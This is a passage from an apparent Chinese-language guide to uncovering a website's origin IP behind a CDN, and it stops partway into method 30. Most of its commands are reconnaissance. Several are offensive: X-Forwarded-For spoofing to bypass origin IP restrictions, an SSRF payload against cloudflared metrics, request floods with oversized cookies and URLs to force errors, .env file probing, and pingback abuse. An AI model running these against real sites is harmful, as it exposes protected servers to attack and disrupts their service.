# services.tls.certificates.leaf_data.subject.common_name: target.com
# services.tls.certificates.leaf_data.names: target.com
# 可组合过滤: NOT services.tls.certificates.leaf_data.issuer.organization: "Cloudflare"

# === Quake（360）===
# https://quake.360.cn/
# domain: target.com
# cert: target.com

# 技巧：搜索证书的 Subject 和 SAN 中都包含目标域名，但 Issuer 不是 Cloudflare 的证书
# 这些往往是源站自己签发的证书
```

### 方法 5：CNAME 解析链追踪（成功率 70%）

```bash
# 递归追踪 CNAME 链，直到找到非 CDN 域名
trace_cname() {
  local domain="$1"
  local depth=0
  echo "== CNAME 追踪: $domain =="
  while [ $depth -lt 10 ]; do
    local cname=$(dig CNAME "$domain" +short | sed 's/\.$//' | head -1)
    if [ -z "$cname" ]; then
      echo "终点: $domain"
      echo "A记录: $(dig A "$domain" +short)"
      echo "AAAA记录: $(dig AAAA "$domain" +short)"
      break
    fi
    echo "  $domain → $cname"
    domain="$cname"
    depth=$((depth + 1))
  done
}
trace_cname "target.com"

# 典型场景分析
# 场景1: target.com → target.cdn.com → 源站域名 → 真实IP（最常见）
# 场景2: target.com → target.com.cdn.cloudflare.net → 无法直接溯源（需要其他方法）
# 场景3: target.com → ELB域名 → EC2域名 → AWS IP（云服务商）
```

### 方法 6：CDN IP 范围反查（成功率 65%）

```bash
# 1. 下载最新 CDN IP 范围
# kaeferjaeger.gay 提供全网 CDN 范围数据
# 自动过滤 CDN IP 的脚本
filter_cdn() {
  local ip="$1"
  # 动态加载 CDN 范围（可定期更新）
  # 返回 0=非CDN, 1=是CDN
}

# 2. ASN 反查与 BGP 分析
# 获取 CDN 边缘节点的 ASN
edge_ip=$(dig +short target.com | head -1)
asn=$(whois "$edge_ip" | grep -i "origin:" | awk '{print $2}' | head -1)
echo "CDN边缘节点ASN: $asn"
# 在 bgp.he.net 查询该 ASN 的所有 IP 段
# 源站 IP 可能在同一 ASN 或上游 ASN 中

# 3. 反向 IP 查询
# 同一台服务器可能托管多个网站
# https://yougetsignal.com/tools/web-sites-on-web-server/
# https://viewdns.info/reverseip/
# https://dnslytics.com/reverse-ip
# https://www.robtex.com/

# 4. 相邻 IP 扫描
# 找到候选 IP 后，扫描同一 /24 网段的其他 IP
# 很多 VPS 在同一网段分配连续 IP
```

### 方法 7：SPF 邮件记录（成功率 60%）

```bash
# 查询并递归解析 SPF
dig TXT target.com +short | grep -i spf | while read spf; do
  echo "SPF: $spf"
  echo "$spf" | grep -oP 'ip4:\K[^\s]+'
  echo "$spf" | grep -oP 'include:\K[^\s]+' | while read inc; do
    echo "  include链: $inc"
    dig TXT "$inc" +short | grep -oP 'ip4:\K[^\s]+'
  done
done
```

### 方法 8：MX 邮件服务器关联（成功率 55%）

```bash
# MX 记录指向的邮件服务器常与 Web 服务器共用 IP
dig MX target.com +short | sort -n | while read prio host; do
  echo "MX: $host (优先级: $prio)"
  ip=$(dig A "$host" +short)
  echo "  IP: $ip"
  # 检查该 IP 是否也响应 HTTP
  result=$(curl -s -o /dev/null -w "%{http_code}" -k -H "Host: target.com" "https://$ip" --connect-timeout 5 2>/dev/null)
  echo "  HTTP: $result"
done
```

### 方法 9：Host 头验证（成功率 55%，关键验证步骤）

```bash
# 批量验证（推荐 httpx，速度快）
cat candidate_ips.txt | httpx -title -status-code -tech-detect -follow-redirects \
  -H "Host: target.com" -o verified.txt

# 手动精确验证（包含完整指纹对比）
verify_ip() {
  local ip="$1"
  local target="$2"
  echo "=== 验证 $ip ==="
  # HTTP状态码
  code=$(curl -s -o /dev/null -w "%{http_code}" -k -H "Host: $target" "https://$ip" --connect-timeout 5)
  echo "HTTP状态码: $code"
  # 页面标题
  title=$(curl -s -k -H "Host: $target" "https://$ip" --connect-timeout 5 | grep -oP '<title>\K[^<]+')
  echo "页面标题: $title"
  # 响应头关键字段
  curl -sIk -H "Host: $target" "https://$ip" --connect-timeout 5 | grep -iE "(server:|x-powered-by:|set-cookie:|content-type:)"
  # 内容长度
  size=$(curl -s -k -H "Host: $target" "https://$ip" --connect-timeout 5 | wc -c)
  echo "内容大小: $size bytes"
}
```

### 方法 10：第三方服务 ID 关联（成功率 50%）

```bash
# 1. Google Analytics / 百度统计 ID 关联
# 通过相同的 GA ID 可以找到同一站长的其他网站
# 在 builtwith.com 或 similarweb.com 反向查询 GA ID
# 提取 GA ID:
curl -s https://target.com | grep -oP '(UA|G|GTM|AW)-[0-9A-Za-z-]+' | sort -u
# 搜索: "UA-12345678-1" site:*
# FOFA: body="UA-12345678-1"

# 2. 域名注册信息关联
# 通过 whois 查询注册人邮箱，反查该邮箱注册的所有域名
# https://whoisology.com/
# https://reverse-whois.com/
# https://viewdns.info/reversewhois/
# 脚本: python3 -c "
# import whois; w = whois.whois('target.com'); print(w.get('emails'))
# "
# 注意: 国内站 whois 已脱敏，优先用 ICP 备案（方法 12）

# 3. 第三方服务 DNS 记录
# 验证域名所有权的 TXT 记录（如 Google Search Console, 阿里云验证）
dig TXT target.com +short | grep -iE "(google-site-verification|alidns|tencent|aws)"

# 4. 网站嵌入的第三方资源 → 反查同源
# 查看页面中引用的 JS/CSS/图片 URL
curl -s https://target.com | grep -oP '(src|href)="https?://[^"]+' | grep -v target.com | sort -u
# 提取所有第三方域名，逐一查 IP + 是否 CDN
curl -s https://target.com | grep -oP 'https?://[^/"]+' | grep -v target.com | sort -u | \
  while read url; do
    host=$(echo "$url" | sed 's|https\?://||' | cut -d/ -f1)
    ip=$(dig +short $host | head -1)
    [ -n "$ip" ] && echo "$host → $ip"
  done

# 5. SameSite cookie 泄露
# 部分 CDN 重写 cookie domain，但 SameSite/cross-origin 配置可能泄露内网
curl -sI https://target.com | grep -iE "^set-cookie"
# 关注: domain=.internal.target.com → 内网域名

# 6. 百度站长/Google Search Console 验证文件
# 验证文件常年在根目录，可反查
curl -s https://target.com/google*.html
curl -s https://target.com/baidu_verify_*.html
# 内容 hash 在 Shodan/FOFA 反查 → 找到同一服务器
```

> **Python 集成**: `cdn_tracer.py` 阶段 3 子域名枚举 + 阶段 4 被动 DNS 已覆盖第三方域名关联。

### 方法 11：网站功能泄露（成功率 50%）

```bash
# 1. RSS/Feed（WordPress 常见）
# /feed/, /feed/rss/, /feed/atom/, /?feed=rss2

# 2. robots.txt 可能暴露内部路径
curl -s https://target.com/robots.txt

# 3. sitemap.xml 可能列出所有子域名
curl -s https://target.com/sitemap.xml | grep -oP 'https?://[^<]+' | sort -u

# 4. 错误页面信息泄露
# 触发 404/500 错误可能暴露服务器信息
curl -s https://target.com/nonexistent_page_12345

# 5. PHPInfo 页面（如果存在）
# /phpinfo.php, /info.php, /php_info.php, /test.php

# 6. 跨域策略文件
curl -s https://target.com/crossdomain.xml
```

### 方法 12：ICP 备案查询（成功率 45%，国内专用）

```bash
# 1. 工信部 ICP 备案查询
# https://beian.miit.gov.cn/ → 输入域名查备案号
# 备案号格式: 京ICP备XXXXXXXX号-X

# 2. 备案号关联反查（同一备案号下所有域名 + IP）
# 爱企查: https://aiqicha.baidu.com/
# 天眼查: https://www.tianyancha.com/
# ICP 备案查询: https://icp.chinaz.com/
# 通过备案号 → 查到公司名下所有域名

# 3. 命令行备案查询
# 开源工具: https://github.com/1in9e/icpdomain
# icpdomain -d target.com
# 返回: 备案号、主办单位、域名列表、审核时间

# 4. 关键技巧：备案域名交叉关联
# 同一公司备案的多个域名，有些可能未使用 CDN
# 未用 CDN 的兄弟域名 → 直接解析到源站 IP
# 兄弟域名 IP 大概率就是目标域名的源站（同机房/同服务器）

# 5. 备案号页面反查
# 备案号链接: https://beian.miit.gov.cn/#/Integrated/recordQuery
# 部分网站底部有备案号链接，爬取兄弟域名
curl -s https://target.com | grep -oP 'icp备\d+号' | head -1
# 在搜索引擎搜 icp备号 → 找同备案号的其他域名

# 6. 公司名 → 子公司资产发现
# 天眼查查公司对外投资 → 子公司域名
# 子公司可能共享基础设施（同一源站 IP）
```

> **Python 集成**: 备案数据可与 `cdn_tracer.py` 方法 4（空间引擎）组合，FOFA `icp="京ICP备XXXX号"` 反查所有关联 IP。

### 方法 13：XML-RPC Pingback（成功率 40%，WordPress 专用）

```bash
# 1. 检测 XML-RPC 是否开启
curl -X POST "https://target.com/xmlrpc.php" -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# 2. 在你的 VPS 上监听
nc -lvp 9999

# 3. 触发 Pingback
curl -X POST "https://target.com/xmlrpc.php" -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://YOUR_VPS_IP:9999</string></value></param>
    <param><value><string>https://target.com/any-post-url</string></value></param>
  </params>
</methodCall>'
# nc 监听中收到的连接 IP 即为源站 IP
```

### 方法 14：邮件头分析（成功率 45%）

```bash
# 1. 注册账号 → 触发验证邮件 → 查看邮件原始源码
# 搜索 "Received: from" 字段
# 最后一个 "Received: from" 通常是源站 IP

# 示例分析
# Received: from mail.target.com (target.com [1.2.3.4])
#     by mx.google.com with ESMTPS id xxxxx
#     for <you@gmail.com>; Thu, 20 Jun 2026 10:00:00 +0800
# → 源站 IP: 1.2.3.4

# 2. 自动提取脚本（解析 .eml）
python3 << 'PYEOF'
import re, sys
with open(sys.argv[1] if len(sys.argv)>1 else 'email.eml', 'r') as f:
    headers = f.read()
# 提取所有 Received 中的 IP
received = re.findall(r'Received:.*?\[([0-9.]+)\]', headers, re.DOTALL)
if received:
    print(f"邮件路径 IP: {received}")
    # 最后一个通常是源站发件 IP
    print(f"疑似源站 IP: {received[-1]}")
PYEOF

# 3. 邮件 Authenticated-Received 行
# 邮件认证头: SPF/PASS, DKIM/SIGNED, DMARC/PASS
# Authenticated-Received 行含原始发件 IP
grep -i "authentication-results" email.eml
grep -i "received-spf" email.eml

# 4. 批量触发（需账户系统）
# 密码重置、账户验证、通知邮件 → 每种触发一种邮件
# 部分邮件类型由不同后端服务发送 → 多 IP 线索

# 5. 邮件退订链接泄露
# 退订 URL 有时直连源站: http://1.2.3.4/unsubscribe?token=xxx
grep -oP 'https?://[0-9.]+/[^"<>\s]+' email.eml | sort -u

# 6. 邮件图片/跟踪像素
# 营销邮件中的图片可能托管在源站
grep -oP 'https?://[^"<>\s]+\.(png|jpg|gif)' email.eml | sort -u | \
  while read url; do
    host=$(echo "$url" | sed 's|https\?://||' | cut -d/ -f1)
    ip=$(dig +short $host | head -1)
    [ -n "$ip" ] && echo "$host → $ip"
  done
```

### 方法 15：Favicon 哈希匹配（成功率 40%）

```bash
# 获取 favicon 哈希（MurmurHash3）
curl -sL https://target.com/favicon.ico -o favicon.ico

# 使用 Python 计算哈希（安装 mmh3: pip install mmh3）
python3 -c "
import mmh3, codecs
with open('favicon.ico', 'rb') as f:
    print(mmh3.hash(codecs.encode(f.read())))
"

# 无需 mmh3 的备选方案 (纯标准库)
python3 -c "
import hashlib
with open('favicon.ico', 'rb') as f:
    print(hashlib.sha256(f.read()).hexdigest())
"

# Shodan 搜索: http.favicon.hash:计算出的哈希值
# FOFA 搜索: icon_hash="计算出的哈希值"
# 技巧：全球唯一哈希值可以在 Shodan/FOFA 中定位到同一台服务器

# 批量多路径尝试
for path in /favicon.ico /favicon.png /static/favicon.ico /assets/favicon.ico /img/favicon.ico; do
  curl -sL "https://target.com${path}" -o "favicon_${path//\//_}.ico"
  [ -s "favicon_${path//\//_}.ico" ] && python3 -c "
import mmh3, codecs
with open('favicon_${path//\//_}.ico', 'rb') as f:
    print(f'${path} → {mmh3.hash(codecs.encode(f.read()))}')
" 2>/dev/null
done

# 关键: 同一 favicon 哈希的 IP 中，排除 CDN 段 → 剩余即源站
# python cdn_ranges.py --filter <Shodan返回的IP列表>
```

### 方法 16：DNS ANY + 搜索引擎缓存（成功率 35%）

```bash
# 1. DNS ANY 查询（所有记录类型）
dig ANY target.com @8.8.8.8 +short
# 可能返回 A/AAAA/MX/TXT/NS/SOA 全部记录
# 注意: 大部分 DNS 服务器已限制 ANY 查询，建议用多服务器轮询

# 2. Google 缓存
# https://webcache.googleusercontent.com/search?q=cache:target.com
# 直接查看首页源码，可能包含源站 IP 链接

# 3. Wayback Machine 历史快照
# https://web.archive.org/web/*/target.com
# 查看历史快照中的资源链接，可能包含源站 IP
# 命令行提取:
curl -s "https://web.archive.org/cdx/search/cdx?url=target.com&output=json&fl=timestamp,original" | \
  jq -r '.[] | @tsv' | head -20
# 批量下载历史快照，搜索 IP 地址
curl -s "https://web.archive.org/web/20200101000000/https://target.com" | \
  grep -oP '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u

# 4. 搜索引擎 Dork（Google/Bing/Baidu）
# site:target.com -www
# intitle:"index of" site:target.com
# inurl:phpinfo.php site:target.com
# intitle:"Apache2 Ubuntu Default Page" site:target.com
# 搜索暴露源站 IP 的错误页面

# 5. security.txt / humans.txt / ads.txt
curl -s https://target.com/.well-known/security.txt
curl -s https://target.com/humans.txt
curl -s https://target.com/ads.txt
# 这些文件可能包含开发者联系方式或内部 URL

# 6. 搜索引擎快照批量提取
# 用搜狗/百度/360 快照查看国内站历史版本
# 火狐/Chrome 缓存: view-source:cache://target.com

# 7. 公共 web archive 批量
# CommonCrawl: https://index.commoncrawl.org/CC-MAIN-2026-XX-index?url=target.com&output=json
# 提取所有历史快照中的 IP
curl -s "https://index.commoncrawl.org/CC-MAIN-2026-26-index?url=target.com/*&output=json" | \
  jq -r '.url' | grep -oP 'https?://[0-9.]+' | sort -u
```

### 方法 17 + 18：IPv6 解析 + DNS 区域传送

```bash
# ====== 方法 17: IPv6 解析 (成功率 25%) ======
# 很多 CDN 不代理 IPv6，直接暴露源站
dig AAAA target.com +short
dig AAAA www.target.com +short
# 对每个子域名都查 IPv6
for sub in $(cat subs.txt); do
  ipv6=$(dig AAAA $sub +short | head -1)
  [ -n "$ipv6" ] && echo "$sub → $ipv6"
done
# 检查 IPv6 是否属于 CDN 段
python3 cdn_ranges.py --filter <IPv6列表>

# 验证 IPv6 → 源站
curl -6 -k -H "Host: target.com" "https://[IPv6地址]" -o /dev/null -w "%{http_code}\n"

# ====== 方法 18: DNS 区域传送 (成功率 15%) ======
# 枚举全部 NS 服务器，尝试 AXFR 区域传送
for ns in $(dig NS target.com +short | sed 's/\.$//'); do
  echo "=== Trying AXFR @ $ns ==="
  # 尝试 AXFR 完整区域传送
  dig AXFR target.com @"$ns" | grep -E "^[a-z].*\s+A\s" | tee -a axfr_results.txt
  # 尝试子域传送
  dig AXFR @$ns target.com +short
done

# 尝试常用 NS 服务器
for ns in $(dig NS target.com +short); do
  echo "NS: $ns"
  host $ns | grep "has address"
done

# 工具辅助
# dnsrecon -d target.com -t axfr
# fierce --domain target.com --dns-servers <ns服务器>
# dnsenum target.com

# 备选: 若 AXFR 失败，尝试暴力枚举（方法 2）
# 用 NS 服务器 IP 做 DNS 解析，可能绕过 CDN 遮蔽
for ns_ip in $(dig NS target.com +short | xargs -I{} dig +short {}); do
  echo "=== 解析器: $ns_ip ==="
  dig A target.com @$ns_ip +short
done
```

### 方法 19：AltDNS 排列生成 + DNS 泛解析过滤（成功率 45%）

```bash
# 1. 使用 AltDNS 生成子域名排列
# git clone https://github.com/infosec-au/altdns
# altdns -i known_subs.txt -o permutations.txt -w words.txt

# 2. 使用 dnsgen 生成排列
# pip install dnsgen
# cat known_subs.txt | dnsgen - | sort -u > permutations.txt

# 3. 排列模式（高命中率）
# {sub}-{word}.target.com, {word}-{sub}.target.com
# {word}.{sub}.target.com, {sub}{word}.target.com
# 常用词: 01, 02, old, new, backup, test, prod, live, v1, v2

# 4. DNS 泛解析检测（关键！避免大量误报）
# 检测是否存在泛解析
dig A "randomnonexistent12345.target.com" +short
# 如果返回 IP → 存在泛解析，需要过滤

# 泛解析过滤脚本
WILDCARD_IP=$(dig A "randomnonexistent12345.target.com" +short | head -1)
if [ -n "$WILDCARD_IP" ]; then
  echo "检测到泛解析: $WILDCARD_IP"
  # 过滤掉泛解析 IP 的子域名
  cat subs.txt | while read sub; do
    ip=$(dig A "$sub" +short | head -1)
    [ "$ip" != "$WILDCARD_IP" ] && echo "$sub → $ip"
  done > subs_no_wildcard.txt
fi
```

### 方法 20：多 DNS 解析器交叉验证（成功率 60%）

```bash
# 使用多个 DNS 解析器避免 DNS 污染/缓存不一致
# 不同解析器可能返回不同的 IP（CDN 节点 vs 真实 IP）

RESOLVERS=(
  "8.8.8.8"        # Google
  "1.1.1.1"        # Cloudflare
  "9.9.9.9"        # Quad9
  "208.67.222.222" # OpenDNS
  "114.114.114.114" # 国内 114DNS
  "223.5.5.5"      # 阿里 DNS
  "119.29.29.29"   # 腾讯 DNS
  "180.76.76.76"   # 百度 DNS
)

for resolver in "${RESOLVERS[@]}"; do
  echo "=== DNS @ $resolver ==="
  dig A target.com @"$resolver" +short
done

# 使用 dnsx 批量查询
# echo target.com | dnsx -a -resp -ns 8.8.8.8,1.1.1.1,114.114.114.114

# 使用 massdns 高速批量解析
# massdns -r resolvers.txt -t A -o S subs.txt > resolved.txt
```

### 方法 21：CSP / CORS 头泄露（成功率 40%）

```bash
# 1. Content-Security-Policy 头分析
curl -sI https://target.com | grep -i "content-security-policy"
# 示例: Content-Security-Policy: default-src 'self' https://origin.target.com
# → origin.target.com 可能是源站域名

# 2. CORS 头分析
curl -sI https://target.com -H "Origin: https://evil.com" | grep -i "access-control"
# Access-Control-Allow-Origin: https://origin.target.com → 可能泄露源站

# 3. 提取 CSP 中所有域名
curl -sI https://target.com | grep -i "content-security-policy" | \
  grep -oP 'https?://[^/\s;"'\'']+' | sort -u

# 4. 提取页面中所有链接域名
curl -s https://target.com | grep -oP '(https?://|//)[^/\s"'\''<>]+' | \
  sed 's|^https\?://||; s|^//||' | sort -u | grep -v "target.com"
```

### 方法 22：CDN 回源 IP 段利用（成功率 55%）

```bash
# 各 CDN 厂商的回源 IP 段是公开的，源站防火墙通常允许这些 IP 访问
# 通过伪造来自 CDN 回源 IP 的请求，可以绕过源站的访问控制

# Cloudflare 回源 IP 段（IPv4）
# https://www.cloudflare.com/ips-v4/
# 173.245.48.0/20, 103.21.244.0/22, 103.22.200.0/22, 103.31.4.0/22
# 141.101.64.0/18, 108.162.192.0/18, 190.93.240.0/20, 188.114.96.0/20
# 197.234.240.0/22, 198.41.128.0/17, 162.158.0.0/15, 104.16.0.0/13
# 104.24.0.0/14, 172.64.0.0/13, 131.0.72.0/22

# 阿里云 CDN 回源 IP 段
# https://help.aliyun.com/document_detail/27107.html

# 利用方法：伪造 X-Forwarded-For 为 CDN 回源 IP
curl -H "Host: target.com" -H "X-Forwarded-For: 173.245.48.1" https://候选IP

# 如果源站配置了仅允许 CDN 回源 IP 访问且未正确验证
# 伪造 X-Forwarded-For 可以绕过 IP 限制
```

### 方法 23：JavaScript / API 端点泄露（成功率 45%）

```bash
# 1. 下载并分析所有 JS 文件
curl -s https://target.com | grep -oP 'src="[^"]+\.js"' | cut -d'"' -f2 | while read js; do
  curl -s "$js" | grep -oP '(https?://|wss?://)[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}[^"'\''\s]*'
done | sort -u

# 2. 搜索 JS 中的 API 端点
curl -s https://target.com | grep -oP '(api\.|ws\.|wss\.)([a-z0-9-]+\.)?target\.com' | sort -u

# 3. 搜索 JS 中的 WebSocket 端点（WebSocket 可能绕过 CDN）
curl -s https://target.com | grep -oP 'wss?://[^"'\''\s]+' | sort -u

# 4. 搜索 sourcemap 文件
# .js.map 文件可能包含原始路径和 IP
curl -s https://target.com/static/js/app.js.map | grep -oP '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'

# 5. 检查 .env 文件泄露（偶发）
curl -s https://target.com/.env | grep -iE "(host|ip|domain|url)"
```

### 方法 24：被动 DNS 数据聚合（成功率 80%，多源交叉验证）

```bash
# 同时查询多个被动 DNS 源，交叉验证提高置信度
# 如果多个源都指向同一 IP → 高置信度

# 聚合脚本
query_passive_dns() {
  local domain="$1"
  local tmp="/tmp/pdns_$$"
  > "$tmp"
  
  # SecurityTrails
  curl -s -H "APIKEY: $ST_KEY" "https://api.securitytrails.com/v1/history/$domain/dns/a" | jq -r '.records[].values[].ip' 2>/dev/null >> "$tmp"
  
  # VirusTotal
  curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=$VT_KEY&domain=$domain" | jq -r '.resolutions[].ip_address' 2>/dev/null >> "$tmp"
  
  # AlienVault OTX
  curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$domain/passive_dns" | jq -r '.passive_dns[].address' 2>/dev/null >> "$tmp"
  
  # HackerTarget
  curl -s "https://api.hackertarget.com/hostsearch/?q=$domain" | grep -oP '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' >> "$tmp"
  
  # 统计每个 IP 出现次数（置信度评分）
  echo "IP 置信度评分 (多源交叉验证):"
  sort "$tmp" | uniq -c | sort -rn | grep -vE '^(0\.|127\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)'
}
query_passive_dns "target.com"
```

### 方法 25：证书颁发机构 (CA) 分析（成功率 50%）

```bash
# 获取目标域名的证书信息
openssl s_client -connect target.com:443 -servername target.com </dev/null 2>/dev/null | openssl x509 -text -noout | grep -E "(Issuer:|Subject:|Not Before|Not After|Serial)"

# 分析逻辑：
# 1. 如果证书 Issuer 是 "Cloudflare Origin CA" → 源站可能使用 Cloudflare 签发的证书
# 2. 如果证书 Issuer 是 "Let's Encrypt" / "DigiCert" / "Sectigo" → 标准 CA
# 3. 在 crt.sh 中搜索同一 Issuer 签发的其他证书 → 可能找到未使用 CDN 的域名

# 搜索同一 CA 签发的其他证书
curl -s "https://crt.sh/?q=target.com&output=json" | jq -r '.[] | "\(.issuer_name) | \(.name_value)"' | sort -u

# 关键技巧：找到 Issuer 不是 Cloudflare/Amazon/Akamai 的证书
# 这些证书很可能是源站自己签发的
curl -s "https://crt.sh/?q=target.com&output=json" | jq -r '.[] | select(.issuer_name | contains("Cloudflare") | not) | .name_value' | sort -u
```

### 方法 26：HTTP 重定向链分析（成功率 35%）

```bash
# 追踪完整的 HTTP 重定向链
curl -sIL https://target.com --max-redirs 10 2>&1 | grep -E "(^HTTP/|^Location:|^Server:|^X-)" | tee redirect_chain.txt

# 分析重定向链：
# 1. 如果重定向到非 CDN 域名 → 新域名可能直接暴露源站
# 2. 3xx 跳转的 Location 头可能包含源站 IP
# 3. 追踪每个跳转的 Server 头，变化可能指示 CDN 边界

# 示例分析
# HTTP/2 301 → Location: https://target.com/new-path → Server: cloudflare
# HTTP/1.1 200 → Server: nginx/1.18.0 → 可能是源站！

# 自动化重定向链追踪 + 提取 IP
python3 << 'PYEOF'
import requests, re
url = "https://target.com"
session = requests.Session()
resp = session.get(url, allow_redirects=True, headers={"User-Agent": "Mozilla/5.0"})
print("重定向链:")
for i, r in enumerate(resp.history):
    loc = r.headers.get("Location", "-")
    ip = re.findall(r'([0-9]{1,3}\.){3}[0-9]{1,3}', loc)
    print(f"  {i+1}. {r.status_code} → {loc[:80]}")
    if ip: print(f"     [IP泄露] {ip}")
    print(f"     Server: {r.headers.get('Server', '-')}")
print(f" 最终: {resp.status_code} → {resp.url}")
print(f"  Server: {resp.headers.get('Server', '-')}")
PYEOF

# 递归重定向（含 JS meta refresh）
python3 -c "
import requests
url = 'https://target.com'
r = requests.get(url, allow_redirects=False)
print(f'{r.status_code} → {r.headers.get(\"Location\",\"-\")}')
# 检查 meta refresh
import re
meta = re.findall(r'<meta[^>]+http-equiv=[\"\']?refresh[\"\']?[^>]+content=[\"\']?\d+;\s*url=([^\"\']+)', r.text, re.I)
if meta: print(f'Meta refresh → {meta[0]}')
"

# 带不同 User-Agent 的重定向（可能定向到不同后端）
for ua in "Mozilla/5.0" "Googlebot" "Bingbot" "Baiduspider"; do
  echo "=== UA: $ua ==="
  curl -sIL -A "$ua" https://target.com | grep -E "^HTTP|^Location:"
done
```

### 方法 27：Cloudflare Tunnel / cloudflared 绕过（成功率 35%，现代 Cloudflare 架构）

> Cloudflare Tunnel（原 Argo Tunnel）通过 `cloudflared` 客户端建立出站隧道，源站不再暴露公网 IP，传统溯源失效。需转向配置泄露与隧道侧信道。

```bash
# === 1. 识别 Tunnel 接入特征 ===
# Tunnel 接入时 DNS 为 CNAME → xxx.cfargotunnel.com
dig CNAME target.com +short | grep -i "cfargotunnel"
dig CNAME *.target.com +short | grep -i "cfargotunnel\|tunnel"
# 出现 *.cfargotunnel.com → 确认使用 Tunnel

# === 2. Tunnel ID 关联反查 ===
# cfargotunnel.com 的子域格式: <tunnel-uuid>.cfargotunnel.com
# 该 UUID 在 cloudflared 配置中是公开的，可关联到 Cloudflare 账户
TUNNEL_UUID=$(dig CNAME target.com +short | grep -oP '[0-9a-f-]{36}' | head -1)
echo "Tunnel UUID: $TUNNEL_UUID"
# 在 GitHub/GitLab 搜索该 UUID（开发者常将 config.yml 提交到仓库）
# GitHub dork: "<tunnel-uuid>" OR "tunnel: <uuid>"

# === 3. cloudflared 配置文件泄露 ===
# 常见泄露路径: .cloudflared/config.yml, ~/.cloudflared/config.yml
# 仓库搜索: filename:config.yml path:.cloudflared
# config.yml 中包含 ingress 规则，可能泄露内网源站 hostname/IP
#   ingress:
#     - hostname: app.target.com
#       service: http://10.0.0.5:8080   ← 内网源站
#     - service: http_status:404

# === 4. Cloudflare Access 配置侧信道 ===
# Access 保护的应用在 401 响应中含 "cloudflareaccess.com"
curl -sI https://app.target.com | grep -i "cf-access"
# Access 的 SSO 配置可能泄露 IdP 域名，关联企业其他资产

# === 5. 隧道端点 DNS 历史回溯 ===
# Tunnel UUID 创建后通常不变，源站迁移时仅改 ingress
# 查询 *.cfargotunnel.com 的历史 DNS 无效（始终指向 Cloudflare 边缘）
# → 改为查询同账户下"未接入 Tunnel 的兄弟域名"
# 同一 Cloudflare 账户往往有部分域名未启用 Tunnel，直接暴露源站

# === 6. cloudflared 客户端调试端点 ===
# 本地运行的 cloudflared 默认监听 metrics: http://127.0.0.1:51801/metrics
# 若源站被 SSRF 命中，可读取 metrics 获取隧道连接信息
# SSRF payload: http://127.0.0.1:51801/metrics
# 关注指标: cloudflared_tunnel_connections, cloudflared_tunnel_server_locations
```

### 方法 28：Cloudflare Pages / Workers / R2 源站暴露（成功率 45%）

```bash
# === 1. Pages 项目源站发现 ===
# Pages 部署会生成 <project>.pages.dev 子域
# 枚举可能的 project name（通常 = 域名主体或仓库名）
for proj in target target-com target-com-prod target-frontend target-blog; do
  curl -sI "https://${proj}.pages.dev" | grep -iE "^HTTP|^server" && echo "命中: ${proj}.pages.dev"
done
# Pages 自定义域名 → 项目，pages.dev 子域直接访问源代码部署版本
# Pages Functions 可能有环境变量泄露源站 API

# === 2. Workers 路由枚举 ===
# Workers 部署在 *.workers.dev，自定义路由 *.target.com/*
# Workers 脚本若调用 fetch(origin_url)，错误信息可能泄露源站
# 触发 Workers 异常: 超长 URL / 特殊字符 / 递归调用
curl -s "https://target.com/$(python3 -c 'print("A"*100000)')" | grep -iE "exception|origin|stack"

# === 3. R2 存储桶直接访问 ===
# R2 自定义域名通过 CDN，但 R2 桶有 *.r2.dev 直连域
# 格式: <account-id>.r2.dev/<bucket> 或通过 Workers 绑定
# 在 JS 中搜索 R2 绑定: env.BUCKET、R2_BUCKET
curl -s https://target.com | grep -oP 'r2\.dev| R2 |r2\.cloudflarestorage'

# === 4. Workers 日志侧信道 ===
# Workers 可配置 tail（实时日志），需 API token
# 若 Workers 代码中 console.log(request.url) → 可能记录源站内部 URL
# 通过 wrangler tail（需授权）或泄露的 token 读取

# === 5. Pages 部署预览链接 ===
# Pages 每次提交生成 deployment 预览: <hash>.<project>.pages.dev
# 预览版本可能包含未压缩的环境变量或调试信息
# 通过 crt.sh 查询 *.pages.dev 证书找到所有部署
curl -s "https://crt.sh/?q=pages.dev&output=json" | jq -r '.[].name_value' | grep -i target
```

### 方法 29：Serverless / Lambda@Edge 源站泄露（成功率 40%）

```bash
# === 1. Lambda@Edge 日志触发 ===
# Lambda@Edge 日志写入 CloudWatch Logs - us-east-1
# 函数错误可能在响应头/Body 中泄露内部 ARN 和源站
# 触发 5xx: 大量并发 / 超长 cookie / 无效压缩请求
for i in $(seq 1 50); do
  curl -s -H "Cookie: $(python3 -c 'print("x"*8000)')" https://target.com/ &
done; wait
curl -sI https://target.com | grep -iE "x-amz|x-cache|lambda|error"

# === 2. CloudFront Function 错误泄露 ===
# CloudFront Function 比 Lambda@Edge 轻，错误直接 5xx
# 观察响应头 x-amz-cf-pop（边缘节点）变化判断回源行为

# === 3. Vercel / Netlify / Render Serverless ===
# Vercel: *.vercel.app，源站可能是 *.now.sh（旧域）
# Netlify: *.netlify.app，deploy preview 子域
# Render: *.onrender.com，源站服务直接暴露
# 搜索: site:vercel.app target / site:netlify.app target
curl -s "https://crt.sh/?q=vercel.app&output=json" | jq -r '.[].name_value' | grep -i target
curl -s "https://crt.sh/?q=netlify.app&output=json" | jq -r '.[].name_value' | grep -i target

# === 4. Serverless 冷启动侧信道 ===
# 冷启动时响应延迟显著增加，且可能返回不同 Server 头
# 连续请求测延迟: 第一帧（冷）→ 后续（热），延迟差 > 1s → 可能是 Serverless
for i in 1 2 3; do
  curl -s -o /dev/null -w "%{time_total}\n" "https://target.com/api/health"
  sleep 30
done

# === 5. Function 环境变量泄露 ===
# 部分框架（Next.js / Nuxt）的 /_next/data/, /_nuxt/ 路径可能泄露 build 配置
curl -s https://target.com/_next/static/chunks/ | grep -oP 'https?://[0-9.]+'
curl -s https://target.com/ | grep -oP '__NEXT_DATA__.*?</script>' | grep -oP 'https?://[^"]+'
```

### 方法 30：HTTP/3 (QUIC) 源站发现（成功率 30%）

```bash
# === 1. 检测 HTTP/3 支持 ===
